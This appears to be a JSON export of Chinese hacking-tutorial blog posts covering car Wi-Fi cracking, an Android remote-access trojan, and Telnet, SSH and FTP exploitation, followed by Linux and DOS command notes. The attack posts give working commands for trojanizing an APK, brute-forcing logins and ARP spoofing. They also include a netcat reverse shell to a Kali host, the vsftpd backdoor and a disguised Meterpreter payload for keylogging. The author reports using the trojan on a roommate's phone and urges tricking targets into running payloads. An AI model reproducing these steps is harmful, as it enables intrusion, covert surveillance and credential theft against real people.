Partners的人用一台普通的单CPU笔记本电脑花了四天时间，但是用多个CPU，一个GPU集群或基于云的资源，你可以在几个小时内破解它。一旦我们用破解的PSK连接到欧蓝德的AP，我们就可以对车辆进行破坏和操作。\n结语此篇由3部分组成的文章只简述了入侵汽车的最基础知识，适合新手了解最基础进攻流程和概念。算了，玩的开心。\n得出结论，汽车安全方面的漏洞其实很多都是为了便利人们所造成的结果。就和web的漏洞很像，可能是因为这方面没有得到很好的重视所导致的。\n\n","slug":"汽车黑客入门","date":"2021-10-26T05:51:57.000Z","categories_index":"汽车黑客","tags_index":"汽车黑客入门","author_index":"Longw"},{"id":"46cf636a853cf895eb01f079c7dbe74c","title":"安卓远控","content":"\n\n\n\n写一点大家喜欢看的东西。。。。。。\n安卓远控远程控制，是在网络上由一台电脑（主控端Remote/客户端）远距离去控制另一台电脑（被控端Host/服务器端）的技术，这里的远程不是字面意思的远距离，一般指通过网络控制远端电脑。\n这次的安卓远控就是将正常的app嵌入恶意代码，当你安装这个app并且运行，那么我就能在网络上监控你。\n这个是在github上的开源的项目，地址是：https://github.com/cleverbao/520apkhook\n话不多说，打开kali，直接克隆。\n安装git clone https:&#x2F;&#x2F;github.com&#x2F;cleverbao&#x2F;520apkhook.git\n\n安装完成要注意你的kali的jdk版本必须为jdk1.8，这样才能运行这个程序。如何安装修改，我们直接百度。\nJava -version   #查看java版本\n\n使用cd 520apkhook\n\n我们打开文件夹，这个文件夹下面有一个Move to iOS_v3.2.0_apkfab.com.apk ，这是作者给你测试的软件。我们先将他重命名一下，改为随你便，我这里是：ceshi.apk\n在上面的基础上\npython3 hook.py --lhost &lt;kaliIP地址&gt; --lport 1433 -n .&#x2F;ceshi.apk\n\n然后，如果你环境满足的话，直接会到写那个，输入证书信息部分。\n[*] 创建app签名文件!\n您的名字与姓氏是什么?\n [Unknown]:  zhouhongyi\n您的组织单位名称是什么?\n [Unknown]:  360\n您的组织名称是什么?\n [Unknown]:  qihu360\n您所在的城市或区域名称是什么?\n [Unknown]:  beijing\n您所在的省&#x2F;市&#x2F;自治区名称是什么?\n [Unknown]:  beijing\n该单位的双字母国家&#x2F;地区代码是什么?\n [Unknown]:  china\nCN&#x3D;zhouhongyi, OU&#x3D;360, O&#x3D;qihu360, L&#x3D;beijing, ST&#x3D;beijing, C&#x3D;china是否正确?\n [否]:  y\n\n按照上面的填就行了，没有黑360的意思。完成后，会直接生成一个叫Final_Infected.apk 和 handler.rc 的程序和文件。那么这个时候就是展现你能力的时候了。让你的目标下载安装并且运行这个Final_Infected.apk 。\n那么当他运行时，我们在kali中就会收到会话。\nmsfconsole -r handler.rc\n\n直接运行脚本了，接下来当对方运行时。我们会收到会话。\nsessions -l   #查看会话\nsessions 1   #使用会话\n\n成功了，就能进行远程控制了。\n我借室友的手机实测了一下，在同一个wifi下，连接没有什么问题。并且安装app时，手机并没有报杀毒之类的。用了一下成功获得室友手机上安装的app的名单。那么接下来就有很多操作空间了。\n下一篇，就写最近看到的汽车黑客。\n\n","slug":"安卓远控","date":"2021-10-25T12:10:12.000Z","categories_index":"远控","tags_index":"github","author_index":"Longw"},{"id":"ee30e4a54bdc40c81ca3faa91eadc5d4","title":"Telnet漏洞","content":"\n\nTelnet介绍(直接复制粘贴)  Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。\n  虽然Telnet较为简单实用也很方便，但是在格外注重安全的现代网络技术中，Telnet并不被重用。原因在于Telnet是一个明文传送协议，它将用户的所有内容，包括用户名和密码都明文在互联网上传送，具有一定的安全隐患，因此许多服务器都会选择禁用Telnet服务。如果我们要使用Telnet的远程登录，使用前应在远端服务器上检查并设置允许Telnet服务的功能。\n  Telnet服务端默认情况下使用23端口。\nTelnet版本获取使用nmap获取telnet版本信息，或者使用metasploit获取对应版本信息。\nnmap -p23 -sV IP地址   #对IP23号端口进行探测\n\nmsfconsole\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version\nset rhosts IP地址\nrun\n\nTelnet密码破解使用metasploit下针对telnet破解的模块进行用户名和密码的破解。\nmsfconsole\nsearch telnet\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login\nset rhosts IP地址\nset user_file 字典路径\nset pass_file 字典路径\nset threads 10\nrun\n\nTelnet登录测试使用破解好的账户名和密码进行登录测试，并执行相应的命令。\n接上面的操作\nsessions -l \nsessioms -i id\n\nTelnet客户端连接Telnet服务器Windows下开启telnet客户端，连接telnet服务端。\ncmd\ntelnet\n?      #查看帮助\no 192.168.249.108    #连接服务器,是uio的o\n输入账号\n输入密码\n成功登录\n\nTelnet明文密码传输使用wireshark抓取telnet数据包\n在kali使用arp欺骗win10自己是主机，然后使用win10连接msf\n通过kali的wireshark抓包获取信息，通过分析找出密码，账号。\nmsf登录Telnet在metasploit中使用telnet_login模块进行登录，并使用sessions -i id 连接shell。\nmsfconsole\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login\nshow options\nset rhosts IP地址\nset username msfadmin\nset password msfadmin\nrun\nsessions -L\nsessions -i 1\n\nmsf连接shell下载exp\n使用wget进行下载\nwget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;8572\n\n但是，这么下载好像不行。所以我们通过kali搭建环境下载。\n再开启一个终端\ncd &#x2F;var&#x2F;www&#x2F;html\nwget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;8572\nmv 8572 test.c    #将8572改为test.c\ncat test.c\nservice apache2 start \n\n然后，我们回到msf会话中\nwget &quot;http:&#x2F;&#x2F;kaliIP地址&#x2F;test.c&quot;    #进行下载\n\n设置kali nc 监听\n使用netcat进行监听，后期返回的shell\nnc -lvp 4444\n\n我们要对程序进行编译执行exp，获取root权限\n再会话中\ngcc test.c -o exploit\n\n这个时候你可能发现有错误，因为c语言在后面要留几行，在kali中的test.c中加上几个空行就行了。\nrm test.c   #先删除会话中下载的test.c\nwget &quot;http:&#x2F;&#x2F;kaliIP地址&#x2F;test.c&quot;\ngcc test.c -o exploit\nls -alh  #查看权限\necho &#39;#!&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;run\necho &#39;&#x2F;bin&#x2F;netcat -e &#x2F;bin&#x2F;sh kaliIP地址:4444&#39; &gt;&gt; &#x2F;tmp&#x2F;run\nps aux|grep udev    #看到一个root执行\n.&#x2F;expolit 2743   #root执行减一\n\n执行完便可在监听端口执行命令，权限为root。前面有问题直接删除。\nrm /tmp/run\nrm exploit\n有些操作前面写过不截图了，方便。其他操作自己看着办吧。\n\n","slug":"Telnet漏洞","date":"2021-10-24T13:44:27.000Z","categories_index":"安全漏洞基础","tags_index":"基础漏洞","author_index":"Longw"},{"id":"68847bc4d9b92f6bbe7e25411fa69ec3","title":"ssh漏洞利用","content":"\n\nSSH（安全外壳协议）SSH 为 [Secure Shell](https://baike.baidu.com/item/Secure Shell) 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行SSH。\nSSH安装我们使用ubuntu下载openssh_service服务\nsudo apt-get install openssh-server \n\n完成后使用以下命令开启关闭ssh服务\nservice ssh start #启动ssh服务\nservice ssh status #状态获取\nservice ssh stop  #关闭ssh服务\n\nSSH客户端安装使用ubuntu搭建ssh客户端\nsudo apt-get install putty-tools\n\n然后太ubuntu的软件中心找到putty并且安装，之后使用客户端连接服务端。\nSSH banner信息获取\nnmap获取ssh banner信息\n\nnmap -sV -p 22 IP地址\n\n\nmetasploit获取ssh banner信息\n\nmsfconsole\nuse auxiliary&#x2F;sacnner&#x2F;ssh&#x2F;ssh_version    \nset rhosts IP地址\nset rport 22\nrun\n\n\nnc获取ssh banner 信息\n\nnc IP地址 22\n\n配置ssh规避banner信息在ssh配置文件sshd_config中新增一行\nDebian Banner no  再次扫描就没有操作系统信息\ncd &#x2F;etc&#x2F;ssh\nsudo gedit sshd_config\ncrtl+f 输入banner 在下面加上\nDebian Banner no  保存\nsevice ssh restart \n\nmedusa ssh 弱口令破解如果在设置ssh服务时，管理员设置了容易破解出来的用户名和密码，那么测试人员就可以使用对应的密码工具进行暴力破解弱口令。破解出来就可以使用对应的用户名和密码登录系统。\nmedusa\nmedusa -d   #查看支持模块\nmedusa -h IP地址 -u 用户名 -p 字典路径 -M 模块   #进行破解\nsucess表示破解成功\n\nSSH命令行工具登录一般情况下Linux下都具有ssh客户端，用来登陆ssh服务端。可以使用ssh用户名@IP地址，然后根据提示输入密码。（默认22端口）\nssh 用户名@IP地址\n\nmetasploit利用ssh登陆反弹shell使用metasploit可以进行ssh登陆(破解)，会自动建立对应的Bash shell连接。\nmsfconsole\nuse auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login\nset rhosts IP地址\nset username xxx\nset password xxx\nrun\n成功后\nsessions -l\nsesssions -i 1\n成功登陆\n\nmetasploit获取meterpreter shell利用获取的Bash shell，注入metasploit中meterpreter payload从而获取更强大功能的shell。\nsessions -u 1\nsessions -i id\n使用后面登陆成功\nhelp  #查看可以使用的命令\n\nSSH安全防御\nssh修改默认端口\n\ncd &#x2F;etc&#x2F;ssh\nsudo gedit sshd_config\nctrl+f  找端口port\n将端口port修改为其他端口，如：2222\nservice ssh restart  重启ssh服务，使修改生效\n\n\nssh设置pgp登陆\n\n在默认情况下，ssh使用用户名和密码进行远程登陆，但也可以使用密钥对进行身份验证登录。(公钥和私钥)\n生成ssh密钥对，使用puttygen\n下载：https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html  可能不对，直接360下载。ok\n打开puttygen生成私钥，保存到桌面private.ppk。使用ssh-keygen命令在Linux生成.ssh目录，在.ssh下新建密钥存储文件authorized_keys.并复制私钥文件到.ssh目录下。使用putty -l命令将内容拷贝到authorized_keys中。之后通过putty加载私钥文件进行ssh连接。\nssh-keygen -t rsa  之后一之前确定，自动生成.ssh目录\nls -alh  查看所有文件\ncd .ssh \ntouch authrized_keys   生成文件\n将private.ppk拷贝到.ssh目录下\nputtygen -L private.ppk   查看内容，之后我们将内容复制\ngedit authorized_keys   打开后，我们将复制内容放进去\n\n完成后使用win10刚刚360下载好的putty客户端加载私钥文件进行连接。\n在Auth里加载文件。\n输入IP地址和端口（刚刚已经改为了2222）\n直接连接。\n\nssh防御暴力破解用户账号\n\n在Linux下可以配置不能使用用户名和密码登陆。只使用ssh pgp方式验证登陆。规避了ssh暴力破解。\n问题：不适用用户名和密码登陆，很大程度上存在复杂操作问题。\ncd &#x2F;etc&#x2F;ssh&#x2F;\nsudo gedit sshd_config\nctrl+f  输入password Authentication\n将yes改为no  保存退出\nservice ssh restart  重启服务\n\n\nIptable设置阈值防止暴力破解\n\nsudo iptables -I INPUT -p tcp --dport 2222 -i eth0 -m state --state NEW -mrecent --set\nsudo iptables -I INPUT -p tcp --dport 2222 -i eth0 -m state --state NEW -m recent --updata --seconds 120 --hitcount 3 -jDROP  #3次密码不对就暂停连接120秒，也可修改时间\nservice ssh restate  #重启服务\n\n表示连接3次不对，停止接收数据包防止暴力破解。最好还是要设置复杂密码，防止被字典跑出来。\n毕竟我曾经在群里看到一个变态跑了一年跑出来了。。。。。。。\n因为安全方面设置好了，前面就没有截图。不过步骤都写的很清楚了。。。\n\n","slug":"ssh漏洞利用","date":"2021-10-15T10:06:04.000Z","categories_index":"安全漏洞基础","tags_index":"基础漏洞","author_index":"Longw"},{"id":"add830c1c066eef908d48bdb9bf71238","title":"FTP漏洞利用","content":"\n\n​                                     开始记录一个安全漏洞利用\nFTP协议文件传输协议(英文：File Transfer Protocol)。是用于在网络上进行文件传输的一套标准协议，使用客户/服务器模式。它属于网络传输协议的应用层。FTP使用21号端口。\nFTP用户分类\nReal    一般用户   \n\nAdministrator  管理员\n\nAnonymous    匿名用户\n\n\nFTP文件传输格式\nASCII\n二进制格式\n\n利用FTP匿名登陆漏洞由于FTP没有禁止匿名用户，所以可以直接使用Anonymous用户直接登录FTP服务器。使用nc连接FTP。\n本次靶机是windows2003企业版     攻击机为kali\n\n打开kali终端切换到root用户，使用kali自带nmap进行目标端口扫描看是否开启FTP服务\n\nnmap IP地址   \n\n\n扫描完成，发现开启了21号端口\n\n使用nmap进行漏洞扫描\n\nnmap --script vuln -p 21 IP地址    #漏洞扫描，p表示端口号，script表示脚本\n\n\n显示有匿名登陆漏洞，直接使用nc测试。\n\n使用nc进行FTP登陆\n\nnc IP地址 21   #进行连接\nUSER anonymous   #输入用户名为匿名用户\nPASS 123  #密码为123\n回车登陆\npwd   #查看当前目录\n\n\n成功登录靶机。\n利用FTP后门漏洞vsftpd手工触发漏洞，当进行FTP认证时，如果用户名中包含:)，那么直接就触发监听6200端口连接的shell。\n本次靶机Metasploittable2-Linux     攻击机kali\n这个漏洞是特定版本才有的，先用nc直接连接，看看是不是有漏洞的版本\n\nnc连接\n\nnc 192.168.249.108 21    #连接靶机\nUSER use:)    #触发漏洞\nPASS 123   #密码随便输入\n\n\n发现成功触发，并没有显示连接失败。接下来打开另一个终端直接连接6200端口\n\nnc连接后门\n\nnc 192.168.249.108 6200   #连接触发的后门\nid    #连接成功后，查看当前用户\n\n\n成功连接后门，并且拥有root权限。\nFTP安全配置\n修改配置文件，禁止匿名登录\n在windows中打开服务器管理，找到FTP，选择属性–&gt;安全—&gt;将允许匿名登陆的勾去掉\n在Linux中找到vsftpd.conf文件，打开找到allow_anonymous将其设置为no或者其他相应否定词\n\n对特定漏洞进行打补丁或者设置防火墙禁止连接后门端口\n打补丁直接更新版本就行\n禁止连接看下面的命令\niptables -A INPUT -p tcp -dport 6200 -j DROP\niptacles -A OUTPUT &#x3D;p tcp sport 6200 -j DROP\n\nFTP用户名密码暴力破解Windows下cmd命令添加用户，并提升为Administrator管理员权限\nnetuser 用户名 用户密码 &#x2F;add   #添加用户\nnet localgroup administrators admin &#x2F;add  #添加到管理员组\n\nWindows下使用FTP服务器添加用户操作\n打开IIS服务，找到FTP，添加用户\n使用medusa暴力破解FTP登录\n本次靶机Windows2003企业版    攻击机kali\nmedusa -d    #查看可以使用的模块\n\n\n发现有FTP模块，利用FTP模块进行暴力破解\nmedusa -h 192.168.249.109 -u admin -P 字典路径 -M ftp   #使用ftp模块，用户名admin，密码用字典进行破解\n\n\n破解成功，发现用户名admin，密码admin测试登录看看。\n\n成功利用破解的用户名和密码登录。\nFTP用户名明文密码的验证FTP协议中用于用户认证的过程中，客户端与服务器端是通过明文进行叫交互信息，验证FTP登录过程中明文传输用户名和密码可以使用wireshark进行抓包分析。\n打开kali的wireshark，在过滤器填写ftp回车，一定要回车不然不会过滤。然后鼠标双击eth0选择抓取的网卡。\n\n接着在终端使用nc进行FTP连接，连接完成后对抓取的数据包进行分析。我们查看本机对连接机发送的数据包，本机ip为192.168.249.112，连接机ip为192.168.249.109.\n\n\n发现明文暴露出连接账户和密码信息，成功验证。\nFTP用户名密码明文嗅探刚刚上面讲到FTP在登陆时是使用明文传输，没有进行加密的。那我们如何进行利用呢？\n我们可以是用arpspoof进行ARP嗅探，就是我们利用脚本对我们进行连接FTP服务器的客户机进行欺骗，使客户机以为我们是网关路由器。欺骗成功后，客户机对网关发送到信息就会被我们接收到然后在传送给路由网关。\n打开终端使用arpspoof脚本\narpspoof -i eth0 192.168.249.1 -t 192.168.249.102   #客户机为102\n\n欺骗开始后不要动。。。。。。\n打开本机win10，在cmd中使用arp -a 。来查看网关的MAC地址是不是kali的MAC地址，若是则代表欺骗成功。\n打开kali另一终端，输入命令：ifconfig   查看mac地址\n再到win10中查看网关mac地址\n00:xx:xx:xx:xx:b0    #kali的MAC地址\n00-50-xx-xx-xx-b0     #win10中网关地址\n\n发现一样，欺骗成功。\n在win10中使用ftp登陆win2003，在kali中使用wireshark抓取数据包，并进行分析。\nftp IP地址    #登录到IP地址的ftp服务\n输入用户名  \n输入密码   \n\n登陆完成后，查看wireshark中中抓取的数据包。\n\n\n成功获得用户名和密码。。。。。。\nFTP登陆之后的事情讲了那么多，那么我们利用漏洞登陆之后该怎么做呢？我们可以利用metasploit建立反弹shell上传到FTP服务器。可以利用setoolkit快速生成反弹shell。\nmsfconsole   #打开msf\nsetoolkit  #使用setoolkit\n1      #选择一些模块，包括后面的\n4\n2\nkali的IP地址\n端口    #后门端口号，设置完成之后立刻生成payload并且询问是否开始监听\nyes   #开始监听\n\n生成的payload在/root/.set里面\ncd &#x2F;root&#x2F;.set   #进入目录\nls   #查看文件\nmv payload.exe &#x2F;home&#x2F;xxx&#x2F;桌面&#x2F;   #将payload移动到桌面\n\n之后我们可以使用任意FTP客户端连接服务器，然后将生成的payload上传到服务器。当然上传之前可以将payload改名和改显示图片，让人看了就忍不住点击打开的哪一种。当管理人员点击打开后，kali中立马会收到会话。\nsessions -l   #查看会话\nsessions -i x  #选择连接x号会话\n\nhelp   #查看帮助\nsysinfo   #查看系统信息\nkeyscan_start    #开启键盘输入记录\nkeyscan_dump   #查看键盘记录\n\n\n键盘输入情况演示\n因为图片加载不出来，自己试试看就知道了，这边就不放图片了。\n当然，还有很多操作可以自己试一试。在进行前最好建立快照，一不小心搞了破坏也方便恢复嘛！！！\n防御\n禁止匿名用户登陆\n及时更新版本，防止老版本漏洞\n设置连接次数防止暴力破解\n密码明文，所以最好不适用FTP，用其他类似替代\n\n\n","slug":"FTP漏洞利用","date":"2021-10-07T07:38:38.000Z","categories_index":"安全漏洞基础","tags_index":"基础漏洞","author_index":"Longw"},{"id":"5edbb0bb0225a5f787cc77b6741890ba","title":"Linux命令","content":"\n\nLinux命令学了好久了，还是不好记住，写个笔记方便查看吧。\n\nRed Hat专属快捷键ctrl+alt+F2   #切换为字符界面(F2~F7个命令行界面)\nctrl+alt+F1   #切换为图形界面\n\n基础命令快捷键反斜杠\\    #强制换行\nTAB    #自动补齐\nCTRL+U  #清空至行首\nCTRL+K  #清空至行尾\nCTRL+L  #清屏\nCTRL+C  #取消本次命令编辑\nxx --help  #查看xx的帮助信息\nman ls   #查看帮助\nuname -r  #查看内核\nuname -a  #查看系统\nwhich uname #当前目录\nhostname   #查看主机名\nifconfig  #查看网卡信息\ncat &#x2F;proc&#x2F;cpuinfo   #查看cpu信息\ncat &#x2F;proc&#x2F;meminfo   #查看内存信息\nreboot  #重启\nshutdown -h now   #立刻关机\npwd   #查看当前目录\n\ncd命令   切换目录cd    #切换目录\ncd &#x2F;etc&#x2F;httpd    #绝对路径\ncd abc    #相对路径\n\nls命令   查看文件ls  #查看目录的文件\nls -l  #详细查看\nls -a  #查看全部文件\nls -h  #察看文件大小\nls -alh  #就上面全部\n\ndu命令   查看文件大小du  #查看当前文件夹大小\ndu -a   #统计时包括所有文件，不仅仅只统计目录\ndu -h   #以更易读懂的字节单位(k,m等)显示信息\ndu -s   #只统计每个参数所占用的空间总的大小\n\nmkdir命令   创建目录mkdir   #创建新目录\nmkdir -p &#x2F;路径名&#x2F; 目录名   #创建目录\n\ntouch命令  创建文件touch  #新建空文件或更新文件时间标记\ntouch 文件名  #新建文件\n\nln命令   建立连接ln    #为文件或目录建立链接(link)\nln -s 源文件或目录 -----&gt; 链接目录   #创建链接\n-s表示建立符号链接文件(省略此项则建立硬链接)\n\ncp命令   复制文件cp   #复制文件或目录\ncp 【选项】 源文件目录 目标文件目录  \n-r  #递归复制整个目录\n-f   #强制覆盖目标同名文件或目录\n-p   #保持源文件的属性不变\n-i   #需要覆盖文件或目录时进行提醒\n\nrm命令   删除文件rm   #删除\nrm 【选项】 文件目录\n-f  #强制删除文件&#x2F;目录,不进行提醒\n-i  #删除文件或目录时提醒用户确认\n-r  #表示递归\n\nmv命令   移动文件mv 【选项】 源文件&#x2F;目录 目标文件&#x2F;目录   #移动文件\n-b   #当目标文件或目录存在时，在执行覆盖前，会为其创建一个备份。\n-i   #如果指定移动的源目录或文件与目标的目录或文件同名，则会先询问是否覆盖旧文件，输入 y 表示直接覆盖，输入 n 表示取消该操作。\n-f   # 如果指定移动的源目录或文件与目标的目录或文件同名，不会询问，直接覆盖旧文件。\n-n   #不要覆盖任何已存在的文件或目录。\n-u   #当源文件比目标文件新或者目标文件不存在时，才执行移动操作\n\nfind命令     查找文件find   #用于查找文件或目录\nfind 查找范围 查找文件\n-name  #按照文件名查找\n-size #按照文件大小查找\n-uesr #按照文件属主查找\n-type #按照文件类型查找\n\nvi命令   编辑文件vi   #表示进入\nvi 【选项】 【t[n]】 【file】\n-r   #用于恢复系统忽然崩溃时正在编辑的文件\n-R   #用于只读方式打开文件\n+n   #用来指明进入vi后直接位于文件的第几行，如不指定n则位于最后一行\na  #在光标后附近文本\nA  #在本行行末附加文本\ni  #在光标前插入文本\nI  #在光标开始时插入文本\no  #在光标下插入新行\nO  #在光标上插入新行\n&#x2F;string 向下 向前搜索指定字符串搜索时忽略大小写\n？  向上\nn  搜索指定字符串的下一个出现位置\n:%s&#x2F;查找内容&#x2F;替换内容&#x2F;g   #全文替换为指定字符串，g表示不提示，s表示搜索，%表示全部\n:n1,n2s&#x2F;查找内容&#x2F;替换内容&#x2F;g   #在一定范围替换指定字符串，n1到n2行\nU  #返回的上一步\n:set nu   #显示行号\n:q    #直接退出\n:wq   #保存后退出\n:q!   #强制退出\n:.   #重复上一个命令\nD   #光标到行尾全部删除\ndd   #删除光标在的那一行\np   #粘贴dd删除的那一行\n\ncat命令   查看文件cat   #显示文件的全部内容\n-n   #给输出的所有行加上编号\ncat 1 2 &gt; 3   #合并文件\n\nwc命令    统计文件内容wc   #统计文件中的单次数量字节数行数\n-I  #统计行数\n-w  #统计单词数\n-c  #统计字符数\nwc sdxh.txt   #会出现 2 4 26,2是行数，4是单词数，26是字符数\nhistory   #查看历史命令\n\ngzip和bzip2命令  压缩文件gzip   bzip2   #都是归档和压缩文件命令\n只针对单个文件压缩\n-g   #显示高压缩比\n-d   #释放压缩文件\ngzip 文件名 压缩文件     #格式为后缀有.gz\nbzip2 文件名 压缩成的文件名  #格式为 文件.bz2,他相对于gzip压缩率更高\n\ntar命令   解压压缩文件tar\ntar -tvf 4.tar -r   #追加TAR文件到归档结尾\ntar -rvf 4.tarr 5   #把5加入到4.tar\n-p  #解包时保留原始文件及目录的权限\n-C  #解包时指定释放的目录文件夹\n-z  #调用gzip程序进行解压或压缩\n-j  #调用bzip2程序进行解压或压缩\ntar -cvzf test.ter.gz 被压缩的文件1 被压缩的文件2   #创建归档压缩文件后缀为bz2\ntar -xvzf test.tar.gz -C &#x2F;usr&#x2F;src  #解压释放归档到&#x2F;usr&#x2F;src里面\ntar -xvjf test.tar.bz2 -C &#x2F;usr&#x2F;src   #解压释放归档到&#x2F;usr&#x2F;src里面\n-c   #创建归档文件扩展名为.tar\n-v   #输出详细信息\n-f   #表示使用归档文件    如-cvf   创建归档文件\ntar -cvf 4.tar 1 2 3   #将文件1 2 3 打包归档为4.tar\ntar -xvf 4.tar    #解包归档文件4.tar\n-xvf   #解包归档文件\n-x    #解开归档文件\n-t    #列表查看包内文件(不释放解包)\n\nchmod 命令   修改权限chmod 777 文件名   #提升权限\nr     #4  表示读\nw    #2  表示写\nx    #1  表示可执行 \n777   #表示任何人都拥有所有权限\n\n编译安装过程下载源代码安装文件包文件\n1： tar解包\n2： .&#x2F;configure配置\n3： make编译\n4： make install 安装\n\napt-get命令   安装apt-get install xxx   #安装xxx,直接从网上下载\ndpkg -i xx   #安装xx，Debian软件包\ndpkg -l xx   #列出与xx有关软件\ndpkg -r xx   #删除\n\nuseradd命令   添加用户useradd [选项] 用户名\n-u  #指定uid标记号\n-d  #指定宿主目录\n-e  #指定账号失效时间\n-g  #指定用户的基本组名(或uid号)\n-G  #指定用户的附加组合名(或Gid号)\n-M  #不为用户建立并初始化宿主目录\n-s  #指定用户的登录shell\n\nuserdel命令    删除账号userdel -r 用户名   #表示连用户的宿主目录一并删除\n\nifconfig命令   查看网络接口信息-eth0   #以太网，局域网\n-lo    #(虚拟)回环设备\nppp0   #使用ppp协议的串口设备(通常指调制调解器)\ntr0   #令牌环(Token Ring)\nfddi0  #光纤\nifdown eth0  #禁用网络接口\nifup eth0   #启用网络接口\n\nnetstat命令   查看网络连接情况netstat [选项]\n-a  #显示所有活动连接\n-n  #以数字形式显示\n-p  #显示进程信息\n-t  #查看tcp协议相关信息\n-u  #查看udp协议相关信息\n-r  #显示路由表信息\n\nroute命令     查看路由表条目route [选项]\n-n   #查看路由表条目\nroute del default gw IP地址   #删除路由表中的默认网关记录\nroute add default gw IP地址   #像路由表添加默认网关记录\nroute add -net 网段地址&#x2F;24 gw IP地址  #添加到指定网段的路由记录\nroute del -net 网段地址&#x2F;24 gw IP地址  #删除到指定网段的路由记录\n\nseivice命令    服务命令service xx start  #启动xx服务\nservice network restart  #重启network网络服务\nservice xx stop   #关闭xx服务\n\n基本上会上面这么多就差不多了。放个链接地址方便继续学习：https://www.linuxcool.com/\n","slug":"Linux命令","date":"2021-09-26T10:03:35.000Z","categories_index":"Linux基础","tags_index":"Linux命令","author_index":"Longw"},{"id":"08b6393a58e95b9436d0c70886fad74f","title":"DOS命令","content":"\n\n常用的DOS命令身为IT人士，怎么能对windows的基本命令不知道呢？来跟我一起学习一下。\n\n来！我们win+r输入cmd进去：\n\n入门命令这黑白对比不是太好看。看一下第一条命令，教你怎么变色;\ncolor  【选项】       # 改变cmd字体颜色\n\ncolor -h   #查看帮助\n\n\n都是中文应该都看得懂的，不懂我们试试嘛：\ncolor a      #变成绿色\n\n\n我靠，兄弟你绿了!\n\n\n这下这条命令都懂了，改变颜色，选项能用 -h  查看。想变什么颜色自己选，嘿嘿嘿！！！\n上面的字有点多，看起来不是太舒服，来看一下清屏命令：\ncls     #清空前面命令页面\n\n\n可以看到鼠标不能往上拉了，说明以前的命令等已经被清空了。下面我们进入重点。\n常用的DOS命令ping命令ping   IP&#x2F;域名     #尝试能否链接此IP&#x2F;域名\n\nping baidu.com     #尝试是否能访问百度，最常用来查看网络是否接通\n\nping -t -I 65500:IP   #死亡之ping，发送大量数据包\n\nipconfig命令常用ipconfig     #帮助用户查看网络状况，如延迟、IP、主机信息、物理地址信息等\n\nipconfig&#x2F;all  #显示本机TCP&#x2F;IP配置的详细信息\n\nipconfig &#x2F;release #DHCP客户端手工释放IP地址\n\nipconfig &#x2F;renew   #DHCP客户端手工向服务器刷新请求\n\n\n不常用ipconfig &#x2F;flushdns  #清除本地DNS缓存内容\n\nipconfig &#x2F;displaydns  #显示本地DNS内容\n\nipconfig &#x2F;registerdns   #DNS客户端手工向服务器进行注册\n\nipconfig &#x2F;showclassid   #显示网络适配器的DHCP类别信息\n\nipconfig &#x2F;setclassid   #设置网络适配器的DHCP类别\n\nipconfig &#x2F;renew “Local Area Connection”  #更新“本地连接”适配器的由 DHCP 分配 IP 地址的配置\n\nipconfig &#x2F;showclassid Local*  #显示名称以 Local 开头的所有适配器的 DHCP 类别 ID\n\nipconfig &#x2F;setclassid “Local Area Connection” TEST #将“本地连接”适配器的 DHCP 类别 ID 设置为 TEST\n\n关于文件/目录的命令目录查看及跳转dir    #查看目录\npwd   #查看当前路径\ncd 目录  #切换到指定目录\nd:    #进入d盘，这个不用cd\ncd ..  #返回上级目录\ncd &#x2F; #跳转到根目录\nhelp cd  #查看cd命令详细信息\ntree    #列出路径中文件树形结构\n\n文件/目录创建及删除copy con d:123.txt   #创建123.txt文件\n立马进入输入模式：hello world\n输入完成按CTRL+z  再按回车退出输入模式\nmd 目录名    #创建目录\nrd 目录名    #删除文件夹\ndel 文件名   #删除文件\n\n文件的查看start 文件名   #按照默认打开方式打开查看，也能打开网页等，如:start www.baidu.com\ntrpe 文件名     #在命令行查看\n\n文件的移动copy 文件 移动目录    #复制文件到移动目录中\nmove 文件 移动目录   #将文件移动到相应目录中\n\n文件重命名ren 原文件名 新文件名        #重命名文件\n\n系统命令systeminfo   #查看系统信息\n\narp命令arp -a   #用于查看高速缓存中的所有项目\narp -a IP  #只显示与该接口相关的ARP缓存项目\narp -s IP 物理地址 #人工配置的物理地址将自动更新该项目\narp -d IP   #使用本命令能够人工删除一个静态项目\n\nshutdown命令shutdown -s -t 180 -c “关机”    #定时关机，并提示\nshutdown -a   #取消计划关机\n\nnet命令net view    #查看局域网内吉他计算机的名称\nnet start    #查看开启了哪些服务\nnet start 服务名   #开启服务(如：net start telent)\nnet stop 服务名   #停止服务\nnet use k:\\\\IP\\c$  #映射目标IP到本地k盘\nnet use k:\\\\IP\\c$&#x2F;del   #断开映射\nnet user 用户名 密码 &#x2F;add   #建立用户\nnet suer 用户名 &#x2F;del   #删除用户\nnet user guest&#x2F;active:yes    #激活guest用户\nnet user #查看有哪些用户\nnet user 账户名  #查看账户属性\nnet localgroup administrators 用户名 &#x2F;add   #把“用户”添加到管理员中\nnet user guest 12345 #用guest登陆后将密码改为12345\nnet password 密码  #更改系统登录密码\nnet share  #查看本地开启的共享\nnet share ipc$   #开启ipc$共享\nnet share ipc$ &#x2F;del   #删除ipc$共享\nnetstat -a   #查看端口\nnetstat -n   #查看端口的网络连接情况\nnetstat -v    #查看正在进行的工作\n\nat命令at id号   #开启已注册的某个计划任务\nat &#x2F;delete #停止所有计划任务用参数&#x2F;yes则不需确定就直接停止\nat id号 &#x2F;delete  #停止某个已注册的计划任务\nat 